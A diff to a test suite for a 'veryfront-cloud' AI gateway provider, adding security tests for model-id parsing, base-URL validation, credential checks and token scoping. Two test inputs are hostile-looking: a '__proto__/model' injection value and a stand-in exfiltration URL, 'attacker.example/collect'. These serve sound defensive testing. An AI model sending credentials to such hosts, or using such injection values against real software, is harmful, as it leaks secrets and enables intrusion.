@@ -33,7 +33,12 @@ describe("provider/veryfront-cloud/shared", () => {
     assertThrows(
       () => parseVeryfrontCloudModelId("openai", "language"),
       Error,
-      'Invalid veryfront-cloud model string: "openai"',
+      "Invalid veryfront-cloud model string",
+    );
+    assertThrows(
+      () => parseVeryfrontCloudModelId("__proto__/model", "language"),
+      Error,
+      "Invalid veryfront-cloud model string",
     );
   });
 
@@ -41,12 +46,12 @@ describe("provider/veryfront-cloud/shared", () => {
     assertThrows(
       () => parseVeryfrontCloudModelId("mistral/mistral-small-2603", "language"),
       Error,
-      'Unsupported Mistral model "mistral/mistral-small-2603"',
+      "Mistral model is not supported",
     );
     assertThrows(
       () => parseVeryfrontCloudModelId("mistral/mistral-medium-3-5", "language"),
       Error,
-      'Unsupported Mistral model "mistral/mistral-medium-3-5"',
+      "Mistral model is not supported",
     );
   });
 
@@ -61,6 +66,41 @@ describe("provider/veryfront-cloud/shared", () => {
     );
   });
 
+  it("rejects unsafe gateway base URLs", () => {
+    assertThrows(
+      () =>
+        getVeryfrontCloudGatewayBaseUrl(
+          "https://user:password@api.veryfront.com",
+          "openai",
+        ),
+      Error,
+      "base URL",
+    );
+  });
+
+  it("rejects whitespace-only gateway credentials and project slugs", () => {
+    assertThrows(
+      () =>
+        createVeryfrontCloudFetch(
+          "   ",
+          undefined,
+          "https://api.veryfront.com/ai/gateway/openai/v1",
+        ),
+      Error,
+      "API token is invalid",
+    );
+    assertThrows(
+      () =>
+        createVeryfrontCloudFetch(
+          "vf_test_provider",
+          "   ",
+          "https://api.veryfront.com/ai/gateway/openai/v1",
+        ),
+      Error,
+      "project slug is invalid",
+    );
+  });
+
   it("rewrites auth headers for the gateway fetch wrapper", async () => {
     let capturedRequest: Request | undefined;
     globalThis.fetch = ((input: URL | Request | string, init?: RequestInit) => {
@@ -68,7 +108,11 @@ describe("provider/veryfront-cloud/shared", () => {
       return Promise.resolve(new Response(null, { status: 204 }));
     }) as typeof fetch;
 
-    const wrappedFetch = createVeryfrontCloudFetch("vf_test_provider");
+    const wrappedFetch = createVeryfrontCloudFetch(
+      "vf_test_provider",
+      undefined,
+      "https://api.veryfront.com/ai/gateway/openai/v1",
+    );
 
     await wrappedFetch("https://api.veryfront.com/ai/gateway/openai/v1/chat/completions", {
       headers: {
@@ -84,6 +128,31 @@ describe("provider/veryfront-cloud/shared", () => {
     assertEquals(capturedRequest?.headers.get("x-goog-api-key"), null);
     assertEquals(capturedRequest?.headers.get("x-extra-header"), "kept");
     assertEquals(capturedRequest?.headers.get("x-veryfront-billing-group-id"), null);
+    assertEquals(capturedRequest?.redirect, "error");
+  });
+
+  it("refuses to attach a gateway token outside the configured gateway", async () => {
+    let fetchCalled = false;
+    globalThis.fetch = (() => {
+      fetchCalled = true;
+      return Promise.resolve(new Response(null, { status: 204 }));
+    }) as typeof fetch;
+    const wrappedFetch = createVeryfrontCloudFetch(
+      "vf_test_provider",
+      undefined,
+      "https://api.veryfront.com/ai/gateway/openai/v1",
+    );
+
+    let caught: unknown;
+    try {
+      await wrappedFetch("https://attacker.example/collect");
+    } catch (error) {
+      caught = error;
+    }
+
+    assertEquals(caught instanceof Error, true);
+    assertEquals((caught as Error).message.includes("vf_test_provider"), false);
+    assertEquals(fetchCalled, false);
   });
 
   it("forwards the request-scoped billing group id to the gateway", async () => {
@@ -93,7 +162,11 @@ describe("provider/veryfront-cloud/shared", () => {
       return Promise.resolve(new Response(null, { status: 204 }));
     }) as typeof fetch;
 
-    const wrappedFetch = createVeryfrontCloudFetch("vf_test_provider");
+    const wrappedFetch = createVeryfrontCloudFetch(
+      "vf_test_provider",
+      undefined,
+      "https://api.veryfront.com/ai/gateway/openai/v1",
+    );
 
     await runWithVeryfrontCloudContext(
       { billingGroupId: "evalrun_20260628_kimi" },
